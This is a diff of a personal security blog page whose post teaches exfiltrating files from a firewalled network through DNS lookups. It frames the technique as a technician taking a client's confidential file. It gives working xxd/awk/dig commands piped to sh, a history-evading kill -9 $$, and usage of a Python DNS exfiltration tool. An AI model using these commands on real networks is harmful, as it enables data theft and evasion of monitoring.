@@ -1,260 +1,124 @@
-<!DOCTYPE html>
-<html lang="en-us">
+<!doctype html><html lang=en>
 <head>
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> dnsfilexfer - yet another take on file transfer via DNS | #!/slash/note</title>
-  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/'>
-  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="dnsfilexfer - yet another take on file transfer via DNS" />
+<title>
+dnsfilexfer - yet another take on file transfer via DNS ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
+this article is not&amp;hellip; &amp;hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.
+">
+<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="dnsfilexfer - yet another take on file transfer via DNS">
+<meta name=twitter:description content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
+this article is not&mldr;
+&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.">
+<meta property="og:title" content="dnsfilexfer - yet another take on file transfer via DNS">
 <meta property="og:description" content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
-this article is not&hellip;
-&hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2014-03-11T00:00:00+00:00" />
-<meta property="article:modified_time" content="2014-03-11T00:00:00+00:00" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="dnsfilexfer - yet another take on file transfer via DNS"/>
-<meta name="twitter:description" content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
-this article is not&hellip;
-&hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts."/>
-
-  
-  
-    
-  
-  
-  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
-
-  
-   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
-  
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  
-
-  
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
-
-  
-  
-  
-  
-  
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44457032-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-  
-  
+this article is not&mldr;
+&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2014-03-11T00:00:00+00:00">
+<meta property="article:modified_time" content="2014-03-11T00:00:00+00:00"><meta property="og:site_name" content="#!/bin/note
+">
 </head>
-
-<body class="max-width mx-auto px3 ltr">
-  <div class="content index py4">
-
-  <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/" aria-label="Previous">
-            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
-          </a>
-        </li>
-        
-        
-        <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
-          </a>
-        </li>
-        <li>
-          <a class="icon" href="#" aria-label="Share">
-            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
-          </a>
-        </li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f" aria-label="Facebook">
-      <i class="fab fa-facebook " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&text=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Twitter">
-      <i class="fab fa-twitter " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Linkedin">
-      <i class="fab fa-linkedin " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&is_video=false&description=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Pinterest">
-      <i class="fab fa-pinterest " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f" aria-label="Email">
-      <i class="fas fa-envelope " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Pocket">
-      <i class="fab fa-get-pocket " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="reddit">
-      <i class="fab fa-reddit " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&name=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&description=%3cp%3eThis%20is%20not%20a%20old%20technique.%20Many%20a%20person%20has%20written%20about%20it%20and%20many%20technical%20methods%20are%20available%20to%20achieve%20this.%20Most%20notably%2c%20a%20concept%20of%20getting%20TCP%20type%20connectivity%20over%20DNS%20tunnels%20is%20probably%20a%20better%20idea%20to%20opt%20for%20should%20you%20wish%20to%20actually%20use%20technology%20like%20this.%20A%20quick%20Google%20even%20revealed%20full%20blown%20dns-tunneling-as-a-service%20type%20offers.%3c%2fp%3e%0a%3ch3%20id%3d%22this-article-is-not%22%3ethis%20article%20is%20not%26hellip%3b%3c%2fh3%3e%0a%3cp%3e%26hellip%3b%20about%20anything%20particularly%20new.%20It%20is%20simply%20my%20ramblings%2c%20and%20some%20python%20code%20slapped%20together%20in%20literally%20a%20day%20in%20order%20for%20me%20to%20learn%20and%20get%20my%20hands%20dirty%20with%20the%20concepts.%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&t=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Hacker News">
-      <i class="fab fa-hacker-news " aria-hidden="true"></i>
-    </a>
-  </li>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
 </ul>
-
-    </div>
-    <div id="toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#this-article-is-not">this article is not&hellip;</a></li>
-      </ul>
-    </li>
-    <li><a href="#the-idea">the idea</a></li>
-    <li><a href="#the-setup">the setup</a></li>
-    <li><a href="#preparing-the-file">preparing the file</a></li>
-    <li><a href="#transferring-the-file">&lsquo;transferring&rsquo; the file</a></li>
-    <li><a href="#back-home">back home</a></li>
-    <li><a href="#python-all-the-things">python all the things</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#sample-usage">sample usage</a></li>
-    <li><a href="#some-afterthoughts">Some afterthoughts</a>
-      <ul>
-        <li><a href="#further-reading">further reading</a></li>
-      </ul>
-    </li>
-  </ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
 </nav>
-    </div>
-  </span>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>dnsfilexfer - yet another take on file transfer via DNS</h1>
+<div class=post-meta>
+<span class=post-date>
+2014-03-11
+</span>
+<span class=post-read-time>— 9 min read</span>
 </div>
-
-
-  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-    <header>
-      <h1 class="posttitle" itemprop="name headline">
-        dnsfilexfer - yet another take on file transfer via DNS
-      </h1>
-      <div class="meta">
-        
-        <div class="postdate">
-          
-          <time datetime="2014-03-11 00:00:00 &#43;0000 UTC" itemprop="datePublished">2014-03-11</time>
-          
-        </div>
-        
-        
-        
-        <div class="article-category">
-            <i class="fas fa-archive"></i>
-            
-            
-            <a class="category-link" href="https://leonjza.github.io/categories/tools">tools</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/dns">dns</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/file-transfer">file transfer</a>
-            
-        </div>
-        
-        
-      </div>
-    </header>
-
-  
-    <div class="content" itemprop="articleBody">
-      <p>This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.</p>
-<h3 id="this-article-is-not">this article is not&hellip;</h3>
-<p>&hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.</p>
-<h2 id="the-idea">the idea</h2>
-<p>At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged &amp; formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.</p>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href=#this-article-is-not>this article is not&mldr;</a></li>
+</ul>
+</li>
+<li><a href=#the-idea>the idea</a></li>
+<li><a href=#the-setup>the setup</a></li>
+<li><a href=#preparing-the-file>preparing the file</a></li>
+<li><a href=#transferring-the-file>&lsquo;transferring&rsquo; the file</a></li>
+<li><a href=#back-home>back home</a></li>
+<li><a href=#python-all-the-things>python all the things</a></li>
+</ul>
+</li>
+<li><a href=#dnsfilexfer>dnsfilexfer</a>
+<ul>
+<li><a href=#sample-usage>sample usage</a></li>
+<li><a href=#some-afterthoughts>Some afterthoughts</a>
+<ul>
+<li><a href=#further-reading>further reading</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</nav></aside>
+<p>This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.</p>
+<h3 id=this-article-is-not>this article is not&mldr;</h3>
+<p>&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.</p>
+<h2 id=the-idea>the idea</h2>
+<p>At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged & formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.</p>
 <p>Consider the following scenario.</p>
 <p>You have access to a very <em>secure</em> network. <em>Secure</em> in the sense that the firewalls are configured to allow <strong>NO</strong> outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this <em>secure</em> network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.</p>
 <p>You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, <code>z300_technical_diagrams.zip</code>. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.</p>
 <p>Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi &lsquo;non-suspect&rsquo; DNS lookup requests.</p>
-<h2 id="the-setup">the setup</h2>
+<h2 id=the-setup>the setup</h2>
 <p>So, to get the file <code>z300_technical_diagrams.zip</code> out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)</p>
 <pre><code>% dig A 123456.fake.com @127.0.0.1
 
@@ -275,7 +139,7 @@ if (!doNotTrack) {
 ;; WHEN: Tue Mar 11 07:55:31 2014
 ;; MSG SIZE  rcvd: 49
 </code></pre><p>Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.</p>
-<h2 id="preparing-the-file">preparing the file</h2>
+<h2 id=preparing-the-file>preparing the file</h2>
 <p>With comms working to our name server, we can get some information about the file and test if a hex dump tool like <code>xxd</code> is available. This will enable us to break the file up in to little parts that can be used as DNS questions.</p>
 <pre><code>% ls -lah z300_technical_diagrams.zip
 -rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
@@ -286,7 +150,7 @@ e3523947e35275780b000104f50100000414000000504b03040a00000000
 0049a938440000000000000000000000001b001c007068616e746f6d6a73
 [snip]
 </code></pre><p>Great. It looks like we have everything we need to make this work. :)</p>
-<h2 id="transferring-the-file">&lsquo;transferring&rsquo; the file</h2>
+<h2 id=transferring-the-file>&lsquo;transferring&rsquo; the file</h2>
 <p>Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:</p>
 <pre><code>% xxd -p z300_technical_diagrams.zip | awk '{ print &quot;dig &quot; $1 &quot;.fake.io @127.0.0.1 +short&quot; }'
 dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
@@ -300,7 +164,7 @@ dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.
 [snip]
 </code></pre><p>As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with <code>| sh</code> at the end, performing the actual lookups.
 On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.</p>
-<h2 id="back-home">back home</h2>
+<h2 id=back-home>back home</h2>
 <p>We close our bash session with <code>kill -9 $$</code> to prevent any history from writing and relogin, completing the original work we came for.</p>
 <p>Back home, it was time to stop the <code>tcpdump</code> that was running, and attempt to reassemble that file. The domain we used for the lookups was <code>fake.io</code>, so we just grep the output for that to ensure that we got the relevant parts (real ip&rsquo;s masked to 127.0.0.1):</p>
 <pre><code>% tcpdump -r raw -n | grep fake.io
@@ -319,15 +183,15 @@ reading from file raw, link-type NULL (BSD loopback)
 
 % file z300_technical_diagrams.zip
 z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract
-</code></pre><h2 id="python-all-the-things">python all the things</h2>
+</code></pre><h2 id=python-all-the-things>python all the things</h2>
 <p>Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the <code>dig</code> command to timeout, and it would retry like 3 times which would mean you would need to <code>uniq</code> your results before you <code>xxd -r</code> them.</p>
 <p>So, in order for me to <em>learn something new</em>, I figured I&rsquo;d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o</p>
 <p>The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.</p>
-<h1 id="dnsfilexfer">dnsfilexfer</h1>
-<p>So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; <code>dns_send.py</code> &amp; <code>dns_recv.py</code>, one is able to &lsquo;send files&rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the <code>-X</code> flag, and have the output ready to use with <code>xxd -r</code> later on your server.</p>
-<p>The code can be <a href="https://github.com/leonjza/dnsfilexfer">found here</a></p>
-<h2 id="sample-usage">sample usage</h2>
-<p>Below a full example of the usage, both on the client &amp; server:</p>
+<h1 id=dnsfilexfer>dnsfilexfer</h1>
+<p>So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; <code>dns_send.py</code> & <code>dns_recv.py</code>, one is able to &lsquo;send files&rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the <code>-X</code> flag, and have the output ready to use with <code>xxd -r</code> later on your server.</p>
+<p>The code can be <a href=https://github.com/leonjza/dnsfilexfer>found here</a></p>
+<h2 id=sample-usage>sample usage</h2>
+<p>Below a full example of the usage, both on the client & server:</p>
 <p>We start the &lsquo;server&rsquo; component along with a secret that will be used to decrypt received messages. For now, we have omitted <code>-F</code> as we are not going to write the message to a file, yet.</p>
 <pre><code>% sudo python dns_recv.py --listen 0.0.0.0 --secret
 What is the secret?
@@ -388,192 +252,42 @@ Cool eh?
 ---END OF MESSAGE---
 </code></pre><p>The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats <em>should</em> work just fine. <strong>HOWEVER</strong> Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.</p>
 <p>Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.</p>
-<h2 id="some-afterthoughts">Some afterthoughts</h2>
-<p>So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with <code>--domain</code> on the sending script, and have something like <code>fake.&lt;your valid zone&gt;.com</code>, which will result in you still being able to grep for <code>fake</code> in the tcpdump replay.</p>
-<h3 id="further-reading">further reading</h3>
-<p><a href="https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306">https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306</a>
-<a href="http://www.aldeid.com/wiki/File-transfer-via-DNS">http://www.aldeid.com/wiki/File-transfer-via-DNS</a></p>
-    </div>
-  </article>
-
-  
-  
-
-
-
-
-  
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-          <script type="text/javascript">
-          
-          (function() {
-              
-              
-              
-              
-          
-              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-              var disqus_shortname = 'slashnote';
-              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-          })();
-          </script>
-          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-    </div>
-
-  
-
-
-  <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#this-article-is-not">this article is not&hellip;</a></li>
-      </ul>
-    </li>
-    <li><a href="#the-idea">the idea</a></li>
-    <li><a href="#the-setup">the setup</a></li>
-    <li><a href="#preparing-the-file">preparing the file</a></li>
-    <li><a href="#transferring-the-file">&lsquo;transferring&rsquo; the file</a></li>
-    <li><a href="#back-home">back home</a></li>
-    <li><a href="#python-all-the-things">python all the things</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#sample-usage">sample usage</a></li>
-    <li><a href="#some-afterthoughts">Some afterthoughts</a>
-      <ul>
-        <li><a href="#further-reading">further reading</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f" aria-label="Facebook">
-      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&text=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Twitter">
-      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Linkedin">
-      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&is_video=false&description=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS" aria-label="Pinterest">
